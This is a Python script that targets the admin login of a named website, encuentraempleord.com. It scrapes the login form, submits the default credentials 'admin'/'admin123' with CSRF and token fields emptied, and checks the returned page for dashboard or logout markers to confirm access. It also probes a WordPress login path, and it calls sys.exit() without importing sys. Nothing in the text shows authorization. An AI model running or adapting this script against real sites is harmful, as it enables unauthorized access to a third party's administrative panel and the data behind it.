#!/usr/bin/env python3
"""verify encuentraempleord.com - strict replay"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

def fetch(url, data=None, timeout=12):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
                                     headers={**UA, "Content-Type": "application/x-www-form-urlencoded"})
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read().decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

code, final, body = fetch("http://encuentraempleord.com/admin/login")
print("1) GET /admin/login:", code, final, "size", len(body))
print("   has password:", "password" in body.lower())
m = re.search(r"<form[^>]*action=[\"']([^\"']*)[\"'][^>]*>", body, re.I)
action = m.group(1) if m else ""
if action and not action.startswith("http"):
    action = urllib.parse.urljoin(final, action)
print("   form action:", action)

# find fields
fields = {}
for fm in re.finditer(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', body, re.I):
    tag = fm.group(0)
    ft = re.search(r'type=["\']([^"\']+)["\']', tag, re.I)
    fields[fm.group(1)] = ft.group(1).lower() if ft else "text"
print("   fields:", fields)
uf = pf = None
for n, t in fields.items():
    nl = n.lower()
    if pf is None and ("pass" in nl or "pwd" in nl or t == "password"): pf = n
    elif uf is None and ("user" in nl or "login" in nl or "name" in nl or "account" in nl or "admin" in nl): uf = n
print("   uf=%s pf=%s" % (uf, pf))
if not pf:
    print("NO PASS FIELD - check if WP")
    code, final, body = fetch("http://encuentraempleord.com/wp-login.php")
    print("wp-login:", code, final, "user_login:", "user_login" in body)
    sys.exit()
payload = {}
for n, t in fields.items():
    nl = n.lower()
    if n == uf: payload[n] = "admin"
    elif n == pf: payload[n] = "admin123"
    elif t == "hidden" or any(k in nl for k in ["token", "csrf", "check", "code", "validate", "submit"]): payload[n] = ""
code2, final2, resp = fetch(action, data=urllib.parse.urlencode(payload))
print("2) POST:", code2, final2, "size", len(resp))
print("   resp head:", resp[:200].replace("\n", " "))

# re-GET with session
code3, final3, body3 = fetch("http://encuentraempleord.com/admin/login")
print("3) RE-GET:", code3, final3, "size", len(body3))
print("   still login:", "type=\"password\"" in body3.lower())
for kw in ["dashboard", "仪表盘", "logout", "退出", "欢迎", "welcome", "管理", "frame"]:
    if kw in body3.lower():
        print("   marker:", kw)
